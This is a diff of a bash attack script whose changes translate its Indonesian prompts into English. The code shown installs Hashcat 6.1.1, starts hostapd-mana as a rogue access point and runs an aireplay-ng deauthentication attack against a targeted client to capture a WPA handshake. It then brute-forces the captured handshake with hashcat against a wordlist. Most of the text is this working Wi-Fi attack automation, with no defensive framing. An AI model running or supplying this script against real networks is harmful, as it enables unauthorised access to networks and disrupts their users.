@@ -112,40 +112,40 @@ install_hashcat() {
         current_version=$(hashcat --version | sed 's/^v//' | awk '{print $1}')
         if [[ "$current_version" == "6.1.1" ]]; then
             echo ""
-            echo "✅ Hashcat 6.1.1 sudah terinstall. Melewati instalasi."
+            echo "✅ Hashcat 6.1.1 is already installed. Skipping installation."
             sleep 1
             return
         else
             echo ""
-            echo "⚠️ WARNING: Hashcat versi terdeteksi $current_version."
-            echo "Tool ini membutuhkan **tepat** Hashcat versi 6.1.1 untuk otomatisasi cracking."
-            echo "Menginstal akan MENGGANTIKAN instalasi Hashcat kamu saat ini."
+            echo "⚠️ WARNING: Detected Hashcat version $current_version."
+            echo "This tool requires **exactly** Hashcat version 6.1.1 for automated cracking."
+            echo "Installing will OVERWRITE your current Hashcat installation."
         fi
     else
         echo ""
-        echo "⚠️ Hashcat belum ditemukan di sistem."
+        echo "⚠️ Hashcat not detected on this system."
     fi
 
     echo ""
-    if confirm "Apakah Anda ingin mengunduh dan menginstal Hashcat 6.1.1 sekarang?"; then
+    if confirm "Would you like to download and install Hashcat 6.1.1 now?"; then
         echo ""
-        echo "⌛ Mengunduh Hashcat 6.1.1..."
+        echo "⌛ Downloading Hashcat 6.1.1..."
         curl -LO https://hashcat.net/files/hashcat-6.1.1.7z
 
         if [ ! -f "hashcat-6.1.1.7z" ]; then
-            echo "❌ Gagal mengunduh Hashcat. Cek koneksi internet Anda."
+            echo "❌ Failed to download Hashcat. Please check your internet connection."
             exit 1
         fi
 
         echo ""
-        echo "📦 Mengekstrak hashcat-6.1.1.7z..."
+        echo "📦 Extracting hashcat-6.1.1.7z..."
         if ! command -v 7z &>/dev/null; then
-            echo "7z diperlukan untuk ekstrak file .7z."
-            if confirm "Install p7zip-full sekarang?"; then
+            echo "7z is required to extract .7z archives."
+            if confirm "Install p7zip-full package now?"; then
                 sudo apt update
                 sudo apt install -y p7zip-full
             else
-                echo "❌ Tidak bisa melanjutkan tanpa 7z. Exiting."
+                echo "❌ Cannot proceed without 7z support. Exiting."
                 exit 1
             fi
         fi
@@ -153,28 +153,29 @@ install_hashcat() {
         7z x hashcat-6.1.1.7z > /dev/null
 
         if [ ! -d "hashcat-6.1.1" ]; then
-            echo "❌ Ekstraksi gagal. Ada masalah saat unpacking."
+            echo "❌ Extraction failed. Unpacking error occurred."
             exit 1
         fi
 
         echo ""
-        echo "🚀 Memindahkan Hashcat 6.1.1 ke /usr/local/bin..."
+        echo "🚀 Moving Hashcat 6.1.1 to /usr/local/bin..."
         sudo rm -rf /usr/local/bin/hashcat-6.1.1
         sudo mv hashcat-6.1.1 /usr/local/bin/hashcat-6.1.1
 
         sudo ln -sf /usr/local/bin/hashcat-6.1.1/hashcat.bin /usr/local/bin/hashcat
 
         echo ""
-        echo "✅ Hashcat 6.1.1 berhasil diinstall!"
+        echo "✅ Hashcat 6.1.1 installation completed successfully!"
         hashcat --version
         sleep 1
     else
         echo ""
-        echo "❌ Instalasi Hashcat 6.1.1 dibatalkan."
-        echo "Fitur cracking otomatis tidak akan tersedia."
+        echo "❌ Hashcat 6.1.1 installation cancelled."
+        echo "Automated cracking features will be unavailable."
         sleep 2
     fi
 }
+
 
 confirm() {
     while true; do
@@ -429,7 +430,6 @@ echo "Target client selected: $TARGET_CLIENT_MAC"
 
 echo "Starting hostapd-mana for Rogue AP deployment in a new terminal..."
 
-# Jalankan hostapd-mana di TERMINAL BARU, bukan background biasa
 launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\" -dd"
 
 sleep 3
@@ -438,24 +438,19 @@ echo ""
 echo "Initiating deauthentication attack against target client in another terminal..."
 launch_terminal "echo 'Deauth Attack - Tekan CTRL+C untuk stop'; sudo aireplay-ng --deauth 1000 -a $TARGET_BSSID -c $TARGET_CLIENT_MAC $TARGET_MONITOR_IFACE"
 
-# Tunggu user konfirmasi setelah deauth selesai
 echo ""
-read -rp "Tekan [ENTER] di terminal utama ini setelah deauth selesai untuk lanjut..."
+read -rp "Press [ENTER] in this main terminal after deauthentication is complete to continue..."
 
-# Tanya lagi sebelum matikan hostapd-mana
-read -rp "Tekan [ENTER] sekali lagi untuk menghentikan hostapd-mana dan lanjut ke pengecekan handshake..."
+read -rp "Press [ENTER] again to terminate hostapd-mana and proceed to handshake verification..."
 
-# Coba bunuh hostapd-mana berdasarkan nama process (supaya clean)
-echo "Memberhentikan hostapd-mana..."
+echo "Stopping hostapd-mana..."
 sudo pkill -f "hostapd-mana \"$CONFIG_FILE\""
 
 sleep 2
 
-
-# Cek apakah file handshake ada dan berisi
 if command -v hashcat &>/dev/null; then
     hashcat_version=$(hashcat --version | sed 's/^v//' | awk '{print $1}')
-    echo "Versi hashcat terdeteksi: $hashcat_version"
+    echo "Detected Hashcat version: $hashcat_version"
 
     required_version="6.1.1"
 
@@ -464,29 +459,28 @@ if command -v hashcat &>/dev/null; then
     }
 
     if version_compare "$hashcat_version" "$required_version"; then
-        echo "✅ Hashcat versi memenuhi syarat."
+        echo "✅ Hashcat version requirement satisfied."
 
-        # Tanya ke user untuk path wordlist
         echo ""
-        read -rp "Masukkan path lengkap ke wordlist untuk brute-force (contoh: /home/user/wordlist.txt): " WORDLIST_PATH
+        read -rp "Enter the full path to your wordlist file (e.g., /home/user/wordlist.txt): " WORDLIST_PATH
 
         if [ ! -f "$WORDLIST_PATH" ]; then
-            echo "❌ Wordlist tidak ditemukan di path: $WORDLIST_PATH"
+            echo "❌ Wordlist file not found at: $WORDLIST_PATH"
             exit 1
         fi
 
         echo ""
-        echo "Memulai serangan brute-force dengan hashcat..."
+        echo "Starting brute-force attack with Hashcat..."
         echo "Command: sudo hashcat -a 0 -m 2500 \"${TARGET_ESSID}-handshake.hccapx\" \"$WORDLIST_PATH\" --force"
 
         sudo hashcat -a 0 -m 2500 "${TARGET_ESSID}-handshake.hccapx" "$WORDLIST_PATH" --force
 
-        echo "✅ Hashcat selesai dijalankan."
+        echo "✅ Hashcat execution completed."
     else
-        echo "⚠️ Hashcat ditemukan, tapi versinya kurang dari $required_version."
-        echo "Melewati proses brute-force otomatis."
+        echo "⚠️ Hashcat detected, but version is lower than required $required_version."
+        echo "Skipping automated brute-force attack."
     fi
 else
-    echo "⚠️ Hashcat tidak ditemukan di sistem."
-    echo "Melewati proses brute-force otomatis."
+    echo "⚠️ Hashcat is not installed on this system."
+    echo "Skipping automated brute-force attack."
 fi
